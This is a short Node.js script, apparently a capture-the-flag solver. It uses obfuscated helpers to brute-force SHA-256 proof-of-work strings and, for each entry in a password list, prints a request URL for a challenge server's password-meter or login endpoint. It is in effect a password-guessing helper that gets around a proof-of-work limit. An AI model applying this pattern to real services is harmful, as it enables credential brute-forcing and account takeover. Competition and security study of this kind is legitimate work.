'use strict'
const http = require('http')
const sha256 = require('sha256')
const fs = require('fs')
var _0xb7e2 = ["\x65\x6E\x64\x73\x57\x69\x74\x68", "\x70\x72\x6F\x74\x6F\x74\x79\x70\x65", "\x6C\x65\x6E\x67\x74\x68", "\x73\x75\x62\x73\x74\x72\x69\x6E\x67", "", "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39", "\x72\x61\x6E\x64\x6F\x6D", "\x66\x6C\x6F\x6F\x72", "\x63\x68\x61\x72\x41\x74", "\x31\x33\x33\x37", "\x69\x6E\x64\x65\x78\x4F\x66", "\x36\x36\x36\x36\x36"];
if (!String[_0xb7e2[1]][_0xb7e2[0]]) {
    String[_0xb7e2[1]][_0xb7e2[0]] = function (_0xab33x1, _0xab33x2) {
        if (_0xab33x2 === undefined || _0xab33x2 > this[_0xb7e2[2]]) {
            _0xab33x2 = this[_0xb7e2[2]]
        }
        ; return this[_0xb7e2[3]](_0xab33x2 - _0xab33x1[_0xb7e2[2]], _0xab33x2) === _0xab33x1
    }
}
; function rndstr(_0xab33x4) {
    var _0xab33x5 = _0xb7e2[4];
    var _0xab33x6 = _0xb7e2[5];
    for (var _0xab33x7 = 0; _0xab33x7 < _0xab33x4; _0xab33x7++) {
        _0xab33x5 += _0xab33x6[_0xb7e2[8]](Math[_0xb7e2[7]](Math[_0xb7e2[6]]() * _0xab33x6[_0xb7e2[2]]))
    }
    ; return _0xab33x5
}
function cpwpow(_0xab33x9) {
    while (1) {
        var _0xab33xa = rndstr(10);
        var _0xab33xb = sha256(_0xab33x9 + _0xab33xa);
        if (_0xab33xb[_0xb7e2[10]](_0xb7e2[9]) == 0) {
            return _0xab33xa
        }
    }
}
function cloginpow(_0xab33x9) {
    while (1) {
        var _0xab33xa = rndstr(10);
        var _0xab33xb = sha256(_0xab33x9 + _0xab33xa);
        if (_0xab33xb[_0xb7e2[0]](_0xb7e2[11])) {
            return _0xab33xa
        }
    }
}

fs.readFile('./public.password.list', 'utf8', (err, passwds) => {
    passwds = passwds.split('\n')
    let pwd = ''
    let url = ''
    let hasz = ''
    for (let i = 0; i < passwds.length; i++) {
        pwd = passwds[i].trim()
        // hasz = cloginpow(pwd)
        // url = 'http://web.midnightsunctf.se:8000/login/' + pwd + '/' + hasz
        hasz = cpwpow(pwd)
        url = 'http://web.midnightsunctf.se:8000/pwmeter/' + pwd + '/' + hasz
        console.log(url)
    }
})
